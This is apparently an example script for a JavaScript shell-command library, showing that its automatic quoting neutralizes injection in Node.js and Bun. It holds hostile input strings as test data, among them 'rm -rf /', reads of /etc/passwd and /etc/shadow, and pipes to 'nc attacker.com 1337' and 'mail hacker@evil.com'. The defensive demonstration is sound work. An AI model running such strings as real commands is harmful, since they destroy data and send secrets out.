#!/usr/bin/env node
/**
 * Security & Smart Quoting: Node.js vs Bun.js Comparison
 * 
 * This example demonstrates smart auto-quoting and shell injection protection
 * working identically in both Node.js and Bun.js runtimes.
 */

import { $ } from '../../src/$.mjs';

// Runtime detection
const runtime = typeof globalThis.Bun !== 'undefined' ? 'Bun' : 'Node.js';
console.log(`🚀 Running with ${runtime}`);
console.log('=' .repeat(50));

async function securityQuotingComparison() {
  try {
    console.log('1️⃣  Safe String Handling (No Quotes Needed):');
    
    const safeName = 'HelloWorld';
    const safeCmd = 'echo';
    const result1 = await $`${safeCmd} ${safeName}`;
    console.log(`   Safe strings: ${result1.stdout.trim()}`);

    console.log('\n2️⃣  Automatic Quoting for Dangerous Strings:');
    
    const pathWithSpaces = '/path with spaces/file.txt';
    const result2 = await $`echo ${pathWithSpaces}`;
    console.log(`   Path with spaces: ${result2.stdout.trim()}`);
    
    const specialChars = 'test$variable;command';
    const result3 = await $`echo ${specialChars}`;
    console.log(`   Special chars: ${result3.stdout.trim()}`);

    console.log('\n3️⃣  Shell Injection Protection:');
    
    const maliciousInput1 = "'; rm -rf /; echo 'hacked";
    const result4 = await $`echo ${maliciousInput1}`;
    console.log(`   ✅ Injection attempt 1 neutralized: "${result4.stdout.trim()}"`);
    
    const maliciousInput2 = '$(whoami)';
    const result5 = await $`echo ${maliciousInput2}`;
    console.log(`   ✅ Command substitution blocked: "${result5.stdout.trim()}"`);
    
    const maliciousInput3 = '`cat /etc/passwd`';
    const result6 = await $`echo ${maliciousInput3}`;
    console.log(`   ✅ Backtick execution blocked: "${result6.stdout.trim()}"`);

    console.log('\n4️⃣  Variable Expansion Protection:');
    
    const varExpansion = '$HOME';
    const result7 = await $`echo ${varExpansion}`;
    console.log(`   ✅ Variable expansion blocked: "${result7.stdout.trim()}"`);
    
    const complexVar = '${USER:-root}';
    const result8 = await $`echo ${complexVar}`;
    console.log(`   ✅ Complex variable blocked: "${result8.stdout.trim()}"`);

    console.log('\n5️⃣  User-provided Quotes Preservation:');
    
    const userQuotedSingle = "'/path with spaces/file'";
    const result9 = await $`echo ${userQuotedSingle}`;
    console.log(`   User single quotes: ${result9.stdout.trim()}`);
    
    const userQuotedDouble = '"/path with spaces/file"';
    const result10 = await $`echo ${userQuotedDouble}`;
    console.log(`   User double quotes: ${result10.stdout.trim()}`);

    console.log('\n6️⃣  Advanced Injection Attempts:');
    
    const advancedAttack1 = "test' && echo 'injected' && echo '";
    const result11 = await $`echo ${advancedAttack1}`;
    console.log(`   ✅ Advanced attack 1: "${result11.stdout.trim()}"`);
    
    const advancedAttack2 = 'test | nc attacker.com 1337';
    const result12 = await $`echo ${advancedAttack2}`;
    console.log(`   ✅ Network attack blocked: "${result12.stdout.trim()}"`);

    console.log('\n7️⃣  Complex Real-world Scenarios:');
    
    // Simulate user input with various dangerous patterns
    const userInputs = [
      'normal input',
      'path/with spaces',
      'file;rm -rf /',
      '$(cat /etc/shadow)',
      '`whoami`',
      '$HOME/test',
      "'; echo hacked; '",
      'test && echo injected',
      'file | mail hacker@evil.com'
    ];
    
    console.log('   Testing various user inputs:');
    for (let i = 0; i < userInputs.length; i++) {
      const input = userInputs[i];
      try {
        const result = await $`echo ${input}`;
        const output = result.stdout.trim();
        const safe = output === input || output.includes(input);
        console.log(`     ${i + 1}. ${safe ? '✅' : '❌'} "${input}" → "${output}"`);
      } catch (error) {
        console.log(`     ${i + 1}. ⚠️  "${input}" → Error: ${error.message}`);
      }
    }

    console.log('\n8️⃣  File Path Security:');
    
    const dangerousPath = '../../../etc/passwd';
    const result13 = await $`echo ${dangerousPath}`;
    console.log(`   Path traversal: "${result13.stdout.trim()}"`);
    
    const windowsPath = 'C:\\Program Files\\App\\file.exe';
    const result14 = await $`echo ${windowsPath}`;
    console.log(`   Windows path: "${result14.stdout.trim()}"`);

    console.log('\n9️⃣  Unicode and Special Characters:');
    
    const unicodeString = 'Hello 🌍 World! ñáéíóú';
    const result15 = await $`echo ${unicodeString}`;
    console.log(`   Unicode handling: "${result15.stdout.trim()}"`);
    
    const specialCharsTest = '<>&|*?[]{}()';
    const result16 = await $`echo ${specialCharsTest}`;
    console.log(`   Special chars: "${result16.stdout.trim()}"`);

    console.log('\n🔟  Performance - Many Variables:');
    
    const start = Date.now();
    const vars = Array.from({ length: 10 }, (_, i) => `var${i} with spaces`);
    const combined = vars.join(' ');
    const result17 = await $`echo ${combined}`;
    const elapsed = Date.now() - start;
    
    console.log(`   Multiple variables processed in ${elapsed}ms`);
    console.log(`   Result length: ${result17.stdout.trim().length} characters`);

    console.log('\n' + '=' .repeat(50));
    console.log(`✅ All security and quoting features work perfectly in ${runtime}!`);
    console.log('🛡️  Shell injection protection is active and effective!');
    
  } catch (error) {
    console.error(`❌ Error in ${runtime}:`, error.message);
    process.exit(1);
  }
}

securityQuotingComparison();